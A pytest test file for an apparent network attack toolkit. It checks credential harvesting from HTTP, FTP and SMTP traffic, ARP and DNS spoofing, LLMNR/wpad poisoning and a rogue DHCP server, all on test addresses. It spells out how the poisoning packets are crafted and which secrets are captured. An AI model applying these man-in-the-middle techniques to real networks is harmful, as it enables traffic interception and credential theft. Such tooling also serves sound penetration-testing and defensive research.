"""Credential harvesting + active MITM crafting tests."""

from __future__ import annotations

import base64

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether

from reforge.attacks import arp_spoof, dns_spoof, namepoison
from reforge.attacks.creds import CredentialExtractor


def _http(payload: bytes):
    return Ether() / IP(src="10.0.0.5", dst="10.0.0.1") / TCP(sport=1234, dport=80) / payload


# ---- credential harvester --------------------------------------------------
def test_http_basic_auth():
    tok = base64.b64encode(b"admin:s3cret").decode()
    pkt = _http(f"GET /x HTTP/1.1\r\nHost: t\r\nAuthorization: Basic {tok}\r\n\r\n".encode())
    creds = CredentialExtractor().extract(pkt)
    c = next(c for c in creds if c.kind == "http-basic")
    assert c.username == "admin" and c.secret == "s3cret"


def test_http_form_post():
    body = "username=bob&password=hunter2&remember=1"
    pkt = _http((f"POST /login HTTP/1.1\r\nHost: t\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: {len(body)}\r\n\r\n{body}").encode())
    c = next(c for c in CredentialExtractor().extract(pkt) if c.kind == "http-form")
    assert c.username == "bob" and c.secret == "hunter2"


def test_http_cookie():
    pkt = _http(b"GET / HTTP/1.1\r\nHost: t\r\nCookie: SESSION=abc123; theme=dark\r\n\r\n")
    c = next(c for c in CredentialExtractor().extract(pkt) if c.kind == "cookie")
    assert "SESSION=abc123" in c.secret


def test_ftp_user_pass_paired_across_packets():
    ex = CredentialExtractor()
    p1 = Ether() / IP(src="10.0.0.5", dst="10.0.0.9") / TCP(sport=5000, dport=21) / b"USER alice\r\n"
    p2 = Ether() / IP(src="10.0.0.5", dst="10.0.0.9") / TCP(sport=5000, dport=21) / b"PASS wonderland\r\n"
    assert ex.extract(p1) == []                 # USER alone: no cred yet
    creds = ex.extract(p2)
    c = next(c for c in creds if c.proto == "FTP")
    assert c.username == "alice" and c.secret == "wonderland"


def test_smtp_auth_login_base64():
    ex = CredentialExtractor()
    flow = dict(sport=6000, dport=25)
    def seg(data):
        return Ether() / IP(src="10.0.0.5", dst="10.0.0.9") / TCP(**flow) / data
    ex.extract(seg(b"AUTH LOGIN\r\n"))
    ex.extract(seg(base64.b64encode(b"mailer") + b"\r\n"))
    creds = ex.extract(seg(base64.b64encode(b"p@ss") + b"\r\n"))
    c = next(c for c in creds if c.detail == "AUTH LOGIN")
    assert c.username == "mailer" and c.secret == "p@ss"


# ---- ARP spoof crafting ----------------------------------------------------
def test_arp_poison_and_restore_packets():
    p = arp_spoof.poison_packet("10.0.0.5", "aa:aa:aa:aa:aa:aa", "10.0.0.1", "ca:fe:ca:fe:00:01")
    assert p[ARP].op == 2                        # is-at (reply)
    assert p[ARP].psrc == "10.0.0.1"             # claim to be the gateway
    assert p[ARP].hwsrc == "ca:fe:ca:fe:00:01"   # ...at our MAC
    assert p[ARP].pdst == "10.0.0.5"             # to the victim

    r = arp_spoof.restore_packet("10.0.0.5", "aa:aa:aa:aa:aa:aa", "10.0.0.1", "11:22:33:44:55:66")
    assert r[ARP].hwsrc == "11:22:33:44:55:66"   # true gateway MAC


# ---- DNS spoof crafting ----------------------------------------------------
def test_dns_spoof_response():
    query = IP(src="10.0.0.5", dst="10.0.0.53") / UDP(sport=40000, dport=53) \
        / DNS(id=0x1234, rd=1, qd=DNSQR(qname="login.example.com"))
    resp = dns_spoof.spoof_response(query, {"*.example.com": "10.0.0.66"})
    assert resp is not None
    assert resp[DNS].id == 0x1234 and resp[DNS].qr == 1
    assert resp[DNS].an[0].rdata == "10.0.0.66"
    assert resp[IP].dst == "10.0.0.5"            # back to the victim


def test_dns_spoof_no_match_returns_none():
    query = IP(src="10.0.0.5", dst="10.0.0.53") / UDP(sport=1, dport=53) \
        / DNS(qd=DNSQR(qname="safe.test"))
    assert dns_spoof.spoof_response(query, {"evil.test": "1.2.3.4"}) is None


# ---- name poisoning (LLMNR/mDNS via DNS wire format) -----------------------
def test_llmnr_poison_response():
    # LLMNR is DNS wire-format on udp/5355 — we craft/detect it as DNS on that
    # port (never importing scapy.layers.llmnr, which pollutes UDP dissection).
    q = IP(src="10.0.0.5", dst="224.0.0.252") / UDP(sport=50000, dport=5355) \
        / DNS(id=0xABCD, rd=1, qd=DNSQR(qname="wpad"))
    assert namepoison.queried_name(q) == "wpad"
    resp = namepoison.build_response(q, "10.0.0.66")
    assert resp is not None
    assert resp[DNS].an[0].rdata == "10.0.0.66"
    assert resp[UDP].sport == 5355 and resp[UDP].dport == 50000  # back to the querier


# ---- "what landed" activity counters --------------------------------------
def test_dns_spoofer_seen_and_answered_counters():
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    import scapy.sendrecv as SR
    from reforge.attacks.dns_spoof import DnsSpoofer

    sp = DnsSpoofer("lo", {"*.corp.local": "10.0.0.66"})
    orig = SR.send; SR.send = lambda *a, **k: None
    try:
        # a matching query -> seen + answered
        q = Ether() / IP() / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="intranet.corp.local"))
        sp._on(Ether(bytes(q)))
        # a query we don't have a mapping for -> seen but NOT answered
        q2 = Ether() / IP() / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="unmapped.example"))
        sp._on(Ether(bytes(q2)))
    finally:
        SR.send = orig
    st = sp.status()
    assert st["seen"] == 2 and st["answered"] == 1     # on-path, one match


def test_namepoisoner_seen_and_poisoned_counters():
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    import scapy.sendrecv as SR
    from reforge.attacks.namepoison import NamePoisoner

    np = NamePoisoner("lo", "10.0.0.66")
    orig = SR.send; SR.send = lambda *a, **k: None
    try:
        q = Ether() / IP() / UDP(dport=5355) / DNS(rd=1, qd=DNSQR(qname="wpad"))
        np._on(Ether(bytes(q)))
        np._on(Ether() / IP() / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="x")))  # not LLMNR/mDNS/NBT
    finally:
        SR.send = orig
    st = np.status()
    assert st["seen"] == 1 and st["poisoned"] == 1


def test_rogue_dhcp_activity_counters():
    from scapy.layers.dhcp import DHCP
    from scapy.layers.l2 import Ether
    import scapy.sendrecv as SR
    from reforge.attacks import dhcp as D

    rogue = D.RogueDhcp("lo", "10.0.0.1", pool_base="10.0.0.", pool_start=200)
    orig = SR.sendp; SR.sendp = lambda *a, **k: None
    try:
        mac = "02:aa:bb:cc:dd:ee"
        rogue._on(Ether(bytes(D.build_discover(mac, xid=0x99))))
        req = Ether(bytes(D.build_discover(mac, xid=0x99)))
        for i, o in enumerate(req[DHCP].options):
            if isinstance(o, tuple) and o[0] == "message-type":
                req[DHCP].options[i] = ("message-type", 3)
        rogue._on(Ether(bytes(req)))
    finally:
        SR.sendp = orig
    st = rogue.status()
    assert st["discovers"] == 1 and st["offered"] == 1
    assert st["requests"] == 1 and st["leased"] == 1
    assert st["leases"] == {mac: "10.0.0.200"}
